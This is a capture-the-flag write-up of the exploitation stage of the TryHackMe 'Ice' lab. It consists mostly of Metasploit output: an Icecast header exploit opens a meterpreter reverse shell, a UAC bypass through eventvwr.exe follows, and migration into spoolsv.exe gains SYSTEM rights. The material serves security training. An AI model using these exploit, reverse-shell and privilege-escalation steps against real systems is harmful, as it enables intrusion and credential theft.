---
sidebar_position: 2
title: Ice
sidebar_label: Exploitation
description: Deploy & hack into a Windows machine, exploiting a very poorly secured Media Server.
keywords: [ice, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, icecast exploit, CVE-2004-1561]
---


## METASPLOIT

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>windows/http/icecast_header</span>

```log
Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.96.65      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

[*] Started reverse TCP handler on 10.10.20.30:4444 
[*] Sending stage (175686 bytes) to 10.10.96.65
[*] Meterpreter session 1 opened (10.10.20.30:4444 -> 10.10.96.65:49172) at 2022-10-10 06:45:40 +0200
```

```log
meterpreter > getuid 
Server username: Dark-PC\Dark
meterpreter > sysinfo 
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```


<br/>

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>post/multi/recon/local_exploit_suggester</span>

```log
Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

[*] 10.10.96.65 - Collecting local exploits for x86/windows...
[*] 10.10.96.65 - 170 exploit checks are being tried...
[+] 10.10.96.65 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] Post module execution completed
```

<br/>

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>windows/local/bypassuac_eventvwr</span>

```
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

[*] Started reverse TCP handler on 10.10.20.30:4445 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.10.96.65
[*] Meterpreter session 2 opened (10.10.20.30:4445 -> 10.10.96.65:49186) at 2022-10-10 06:50:55 +0200
[*] Cleaning up registry keys ..
```

```log
meterpreter > getuid 
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

<br/>

- We need to move to a Process that has the Permissions that we need to interact with the <b style={{ color: 'DeepSkyBlue' }}>lsass</b> Service. The Service responsible for Authentication within Windows. 
- **Migrating to the Printer Spool Service:** <b style={{ color: 'DeepSkyBlue' }}>spoolsv.exe</b>


```log
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 [..]
 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 [..]

meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2532 to 1268...
[*] Migration completed successfully.
```

<br/>

- We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>

```log
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

---